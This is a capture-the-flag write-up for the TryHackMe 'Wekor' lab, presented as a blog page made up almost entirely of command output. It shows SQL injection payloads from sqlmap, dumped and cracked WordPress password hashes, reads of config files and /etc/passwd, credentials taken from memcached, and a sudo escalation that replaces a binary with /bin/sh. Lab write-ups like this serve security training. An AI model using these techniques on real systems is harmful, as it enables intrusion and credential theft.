<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wekor | Technical Intelligence Labs</title>
    <link rel="stylesheet" href="../css/custom.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; padding-left: 2rem; border-left: 2px solid rgba(255, 255, 255, 0.1); position: relative; }
        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
        .markdown-content h1::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 10px; height: 10px; background: #fff; border-radius: 50%; box-shadow: 0 0 10px #22c55e; border: 2px solid #0f172a; transform: translateY(-50%); }
        .markdown-content h2 { font-size: 1.75rem; color: #f8fafc; margin-top: 3rem; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
        .markdown-content h2::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
        .markdown-content h3 { font-size: 1.25rem; color: #e2e8f0; margin-top: 2rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace; position: relative; }
        .markdown-content h3::before { content: ''; position: absolute; left: -2.3rem; top: 50%; width: 6px; height: 6px; background: #0ea5e9; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; border: 1px solid #334155; position: relative; }
        .markdown-content pre::before { content: "CODE_BLOCK"; position: absolute; top: 0; right: 0; background: #334155; color: #cbd5e1; font-size: 0.6rem; padding: 0.2rem 0.5rem; font-family: 'JetBrains Mono', monospace; border-bottom-left-radius: 0.5rem; }
        .markdown-content blockquote { 
            position: relative;
            border-left: 2px solid #22c55e; 
            padding: 1.5rem 0 1.5rem 1.75rem; 
            color: #cbd5e1; 
            margin-bottom: 2.5rem; 
            font-style: normal; 
            background: rgba(34, 197, 94, 0.03);
            border-radius: 0 4px 4px 0;
            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
        }
        .markdown-content blockquote::before {
            content: "TECHNICAL_INTELLIGENCE";
            position: absolute;
            top: -9px;
            left: 0;
            background: #22c55e;
            color: #000;
            font-size: 0.6rem;
            font-weight: bold;
            padding: 2px 6px;
            font-family: 'JetBrains Mono', monospace;
        }
        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; }
        .markdown-content p { margin-bottom: 1.5rem; }
        
        .diag-card {
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.05);
            padding: 1rem;
            font-family: 'JetBrains Mono', monospace;
            position: relative;
            overflow: hidden;
        }
        .diag-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 2px;
            height: 100%;
            background: #22c55e;
            opacity: 0.5;
        }
        .diag-label {
            display: block;
            font-size: 0.6rem;
            text-transform: uppercase;
            color: #64748b;
            margin-bottom: 0.25rem;
            letter-spacing: 0.1em;
        }
        .diag-value {
            font-size: 0.9rem;
            color: #cbd5e1;
        }
        .diag-blink {
            animation: blink 1s infinite;
        }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body class="bg-slate-950 text-slate-200 antialiased selection:bg-accent-green selection:text-slate-900 flex flex-col min-h-screen">

    <!-- Navigation -->
    <nav class="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-md border-b border-slate-700">
        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
            <a href="../index.html" class="logo-container group flex items-center gap-3">
                 <img src="../images/logo.png" alt="Logo" class="h-10 w-auto group-hover:scale-105 transition-transform duration-300">
            </a>

            <div class="hidden lg:flex items-center gap-8 font-mono text-sm">
                <a href="../index.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Home</a>
                <a href="../about.html" class="text-slate-400 hover:text-accent-cyan transition-colors">About</a>
                <a href="../devhub.html" class="text-slate-400 hover:text-accent-cyan transition-colors">DevHub</a>
                <a href="../projects.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Projects</a>
                <a href="../writeups.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Write-ups</a>
                <a href="../certificates.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Certs</a>
                <a href="../contact.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Contact</a>
            </div>
        </div>
    </nav>

    <!-- Main Content -->
    <main class="py-20 px-6 max-w-4xl mx-auto flex-grow w-full">
        <!-- Post Header -->
        <header class="mb-12 border-b border-slate-800 pb-12">
            <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
                <span>// 2024-12-30</span>
                <span>// ID: REF-Wekor</span>
            </div>
            
            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Wekor</h1>
            
            <div class="flex flex-wrap gap-2">
                <!-- Tags populated by python -->
                <!-- tryhackme, ctf -->
            </div>
        </header>

        <!-- Markdown Body -->
        <div class="markdown-content">
            <pre class="codehilite"><code>PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  tcpwrapped
|_http-title: Site doesn't have a title (text/html).
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
Aggressive OS guesses: Linux 4.15 (98%), Linux 4.15 - 5.19 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.2 - 4.14 (96%), Android 9 - 10 (Linux 4.9 - 4.14) (95%), Linux 5.4 (94%), Linux 2.6.32 - 3.5 (94%), Linux 2.6.32 - 3.13 (93%), Sony X75CH-series Android TV (Android 5.0) (92%), Linux 2.6.32 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 5900/tcp)
HOP RTT        ADDRESS
1   4829.41 ms 10.21.0.1
2   ... 3
4   4846.66 ms wekor.thm (10.201.20.40)
</code></pre>

<pre class="codehilite"><code>User-agent: *
Disallow: /workshop/
Disallow: /root/
Disallow: /lol/
Disallow: /agent/
Disallow: /feed
Disallow: /crawler
Disallow: /boot
Disallow: /comingreallysoon
Disallow: /interesting
</code></pre>

<pre class="codehilite"><code>ffuf -H &quot;Host: FUZZ.wekor.thm&quot; -u http://wekor.thm -t 500 -fs 23 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
________________________________________________

site                    [Status: 200, Size: 143, Words: 27, Lines: 6, Duration: 6588ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
</code></pre>

<pre class="codehilite"><code>❯ gobuster dir -u http://site.wekor.thm -w /usr/share/wordlists/dirb/common.txt

/.htaccess            (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 143]
/server-status        (Status: 403) [Size: 279]
/wordpress            (Status: 301) [Size: 320] [--&gt; http://site.wekor.thm/wordpress/]
Progress: 4613 / 4613 (100.00%)
</code></pre>

<pre class="codehilite"><code>❯ wpscan --url http://site.wekor.thm/wordpress/ -e ap,u

[+] URL: http://site.wekor.thm/wordpress/ [10.201.115.148]
[+] Started: Wed Nov  5 22:31:55 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://site.wekor.thm/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://site.wekor.thm/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://site.wekor.thm/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://site.wekor.thm/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6 identified (Insecure, released on 2020-12-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://site.wekor.thm/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6&lt;/generator&gt;
 |  - http://site.wekor.thm/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6&lt;/generator&gt;

[+] WordPress theme in use: twentytwentyone
 | Location: http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/
 | Last Updated: 2025-08-05T00:00:00.000Z
 | Readme: http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 2.6
 | Style URL: http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.0
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.0, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 &lt;==================================================================&gt; (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://site.wekor.thm/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Nov  5 22:33:00 2025
[+] Requests Done: 54
[+] Cached Requests: 6
[+] Data Sent: 15.043 KB
[+] Data Received: 396.075 KB
[+] Memory used: 260.723 MB
[+] Elapsed time: 00:01:05
</code></pre>

<pre class="codehilite"><code>❯ sqlmap -u &quot;http://wekor.thm/it-next/it_cart.php&quot; -p &quot;coupon_code&quot; --dbs --forms --batch

        ___
       __H__
 ___ ___[&quot;]_____ ___ ___  {1.9.8#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:24:17 /2025-11-06/

[03:24:17] [INFO] testing connection to the target URL
[03:24:18] [INFO] searching for forms
[03:24:19] [INFO] found a total of 3 targets
[2/3] Form:
POST http://wekor.thm/it-next/it_cart.php
POST data: coupon_code=&amp;apply_coupon=Apply%20Coupon
do you want to test this form? [Y/n/q] 
&gt; Y
Edit POST data [default: coupon_code=&amp;apply_coupon=Apply%20Coupon] (Warning: blank fields detected): coupon_code=&amp;apply_coupon=Apply Coupon
do you want to fill blank fields with random values? [Y/n] Y
[03:24:19] [INFO] using '/home/kali/.local/share/sqlmap/output/results-11062025_0324am.csv' as the CSV results file in multiple targets mode
[03:24:20] [INFO] testing if the target URL content is stable
[03:24:21] [INFO] target URL content is stable
[03:24:22] [INFO] heuristic (basic) test shows that POST parameter 'coupon_code' might be injectable (possible DBMS: 'MySQL')
[03:24:23] [INFO] heuristic (XSS) test shows that POST parameter 'coupon_code' might be vulnerable to cross-site scripting (XSS) attacks
[03:24:23] [INFO] testing for SQL injection on POST parameter 'coupon_code'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[03:24:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:24:24] [WARNING] reflective value(s) found and filtering out
[03:24:34] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[03:24:35] [INFO] testing 'Generic inline queries'
[03:24:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[03:24:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[03:25:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[03:25:18] [INFO] POST parameter 'coupon_code' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --string=&quot;Coupon Code Does Not Exist!&quot;)
[03:25:18] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[03:25:19] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[03:25:19] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[03:25:20] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[03:25:20] [INFO] testing 'MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[03:25:20] [INFO] POST parameter 'coupon_code' is 'MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[03:25:20] [INFO] testing 'MySQL inline queries'
[03:25:21] [INFO] testing 'MySQL &gt;= 5.0.12 stacked queries (comment)'
[03:25:21] [INFO] testing 'MySQL &gt;= 5.0.12 stacked queries'
[03:25:22] [INFO] testing 'MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)'
[03:25:22] [INFO] testing 'MySQL &gt;= 5.0.12 stacked queries (query SLEEP)'
[03:25:22] [INFO] testing 'MySQL &lt; 5.0.12 stacked queries (BENCHMARK - comment)'
[03:25:23] [INFO] testing 'MySQL &lt; 5.0.12 stacked queries (BENCHMARK)'
[03:25:24] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)'
[03:25:35] [INFO] POST parameter 'coupon_code' appears to be 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[03:25:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[03:25:35] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[03:25:35] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[03:25:38] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[03:25:40] [INFO] target URL appears to have 3 columns in query
[03:25:41] [INFO] POST parameter 'coupon_code' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[03:25:41] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'coupon_code' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 125 HTTP(s) requests:
---
Parameter: coupon_code (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: coupon_code=ifTS' OR NOT 8638=8638#&amp;apply_coupon=Apply Coupon

    Type: error-based
    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: coupon_code=ifTS' AND GTID_SUBSET(CONCAT(0x7176627671,(SELECT (ELT(7303=7303,1))),0x7176706271),7303)-- pYqe&amp;apply_coupon=Apply Coupon

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: coupon_code=ifTS' AND (SELECT 3266 FROM (SELECT(SLEEP(5)))HmUv)-- ahJe&amp;apply_coupon=Apply Coupon

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: coupon_code=ifTS' UNION ALL SELECT NULL,CONCAT(0x7176627671,0x4177714c68515a4b4d69627069766959626f48794f514d72444158726b4d51457564477177504466,0x7176706271),NULL#&amp;apply_coupon=Apply Coupon
---
do you want to exploit this SQL injection? [Y/n] Y
[03:25:41] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL &gt;= 5.6
[03:25:49] [INFO] fetching database names
available databases [6]:
[*] coupons
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress

[03:25:50] [INFO] skipping 'http://wekor.thm/it-next/it_cart.php?s='
[03:25:50] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-11062025_0324am.csv'                                                                                                                             

[*] ending @ 03:25:50 /2025-11-06/
</code></pre>

<pre class="codehilite"><code>❯ sqlmap -u &quot;http://wekor.thm/it-next/it_cart.php&quot; \
  --data=&quot;coupon_code=&amp;apply_coupon=Apply+Coupon&quot; \
  -p &quot;coupon_code&quot; \
  -D wordpress -T wp_users \
  --dump --batch --forms

        ___
       __H__
 ___ ___[&quot;]_____ ___ ___  {1.9.8#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:39:35 /2025-11-06/

[03:39:35] [INFO] testing connection to the target URL
[03:39:36] [INFO] searching for forms
[03:39:38] [INFO] found a total of 3 targets
[1/3] Form:
POST http://wekor.thm/it-next/it_cart.php
POST data: coupon_code=&amp;apply_coupon=Apply%20Coupon
do you want to test this form? [Y/n/q] 
&gt; Y
Edit POST data [default: coupon_code=&amp;apply_coupon=Apply%20Coupon] (Warning: blank fields detected): coupon_code=&amp;apply_coupon=Apply Coupon
do you want to fill blank fields with random values? [Y/n] Y
[03:39:38] [INFO] resuming back-end DBMS 'mysql' 
[03:39:38] [INFO] using '/home/kali/.local/share/sqlmap/output/results-11062025_0339am.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: coupon_code (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: coupon_code=ifTS' OR NOT 8638=8638#&amp;apply_coupon=Apply Coupon

    Type: error-based
    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: coupon_code=ifTS' AND GTID_SUBSET(CONCAT(0x7176627671,(SELECT (ELT(7303=7303,1))),0x7176706271),7303)-- pYqe&amp;apply_coupon=Apply Coupon

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: coupon_code=ifTS' AND (SELECT 3266 FROM (SELECT(SLEEP(5)))HmUv)-- ahJe&amp;apply_coupon=Apply Coupon

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: coupon_code=ifTS' UNION ALL SELECT NULL,CONCAT(0x7176627671,0x4177714c68515a4b4d69627069766959626f48794f514d72444158726b4d51457564477177504466,0x7176706271),NULL#&amp;apply_coupon=Apply Coupon
---
do you want to exploit this SQL injection? [Y/n] Y
[03:39:45] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL &gt;= 5.6
[03:39:45] [INFO] fetching columns for table 'wp_users' in database 'wordpress'
[03:39:46] [INFO] fetching entries for table 'wp_users' in database 'wordpress'
[03:39:47] [INFO] recognized possible password hashes in column 'user_pass'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [y/N/q] N
Database: wordpress
Table: wp_users
[4 entries]
+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
| ID   | user_url                        | user_pass                          | user_email        | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key                           |
+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
| 1    | http://site.wekor.thm/wordpress | $P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B. | admin@wekor.thm   | admin      | 0           | admin        | admin         | 2021-01-21 20:33:37 | &lt;blank&gt;                                       |
| 5743 | http://jeffrey.com              | $P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 | jeffrey@wekor.thm | wp_jeffrey | 0           | wp jeffrey   | wp_jeffrey    | 2021-01-21 20:34:50 | 1611261290:$P$BufzJsT0fhM94swehg1bpDVTupoxPE0 |
| 5773 | http://yura.com                 | $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ | yura@wekor.thm    | wp_yura    | 0           | wp yura      | wp_yura       | 2021-01-21 20:35:27 | &lt;blank&gt;                                       |
| 5873 | http://eagle.com                | $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ | eagle@wekor.thm   | wp_eagle   | 0           | wp eagle     | wp_eagle      | 2021-01-21 20:36:11 | &lt;blank&gt;                                       |


[*] ending @ 03:39:47 /2025-11-06/
</code></pre>

<pre class="codehilite"><code>❯ hashcat -m 400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --status --status-timer=10


$P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10:rockyou                
$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/:xxxxxx                 
$P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/:soccer13               
Cracking performance lower than expected?                 
</code></pre>

<pre class="codehilite"><code>www-data@osboxes:/$ cat /var/www/html/it-next/config.php
&lt;?php

define(&quot;DB_SERVER&quot;,&quot;localhost&quot;);

define(&quot;DB_USERNAME&quot; , &quot;root&quot;);

define(&quot;DB_PASSWORD&quot;, &quot;root123@#59&quot;);

define(&quot;DB_DATABASE&quot;, &quot;coupons&quot;);

$db = new mysqli(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
$db-&gt;set_charset(&quot;utf8&quot;);

?&gt;
</code></pre>

<pre class="codehilite"><code>www-data@osboxes:/$ cat /var/www/html/site.wekor.thm/wordpress/wp-config.php
&lt;?php
/**

 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'root' );

/** MySQL database password */
define( 'DB_PASSWORD', 'root123@#59' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
</code></pre>

<pre class="codehilite"><code>www-data@osboxes:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
Orka:x:1001:1001::/home/Orka:/bin/bash
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
memcache:x:123:130:Memcached,,,:/nonexistent:/bin/false
</code></pre>

<pre class="codehilite"><code>www-data@osboxes:/$ ps -aux | grep &quot;memca&quot;
memcache   955  0.0  0.3  47724  1588 ?        Ssl  22:09   0:00 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1
www-data  2127  0.0  0.1   3036   884 pts/9    S+   23:58   0:00 grep memca
</code></pre>

<pre class="codehilite"><code>www-data@osboxes:/$ telnet localhost 11211
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
</code></pre>

<pre class="codehilite"><code>get email
VALUE email 0 14
Orka@wekor.thm
END
get username
VALUE username 0 4
Orka
END
get password
VALUE password 0 15
...........
</code></pre>

<blockquote>
<p>I have sudo pwd</p>
</blockquote>
<pre class="codehilite"><code>www-data@osboxes:/home$ su Orka
Password: 
Orka@osboxes:/home$ ls
lost+found  Orka
Orka@osboxes:/home$ cd Orka
Orka@osboxes:~$ ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
Orka@osboxes:~$ cat user.txt
1a26a6d51c0172400add0e297608dec6
Orka@osboxes:~$
</code></pre>

<pre class="codehilite"><code>[sudo] password for Orka:
Matching Defaults entries for Orka on osboxes:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin


Orka@osboxes:~$ ls -la Desktop/bitcoin
-rwxr-xr-x 1 root root 7696 Jan 23 15:23 Desktop/bitcoin
</code></pre>

<pre class="codehilite"><code>Orka@osboxes:~$ mv Desktop a
Orka@osboxes:~$ ls -la
total 116
drwxr-xr-- 18 Orka Orka 4096 Nov  7 02:09 .
drwxr-xr-x  4 root root 4096 Jul 12  2020 ..
drwxrwxr-x  2 root root 4096 Jan 23  2021 a
Orka@osboxes:~$ cp /bin/sh ./Desktop/bitcoin
Orka@osboxes:~$ pwd
/home/Orka
Orka@osboxes:~$ sudo /home/Orka/Desktop/bitcoin
[sudo] password for Orka: 

/home/Orka
# ls
a        Documents  Music     Public     user.txt
Desktop  Downloads  Pictures  Templates  Videos
# cd /root
# ls
cache.php  root.txt  server.py  wordpress_admin.txt
# cat root.txt
</code></pre>
        </div>
    </main>

    <!-- Footer -->
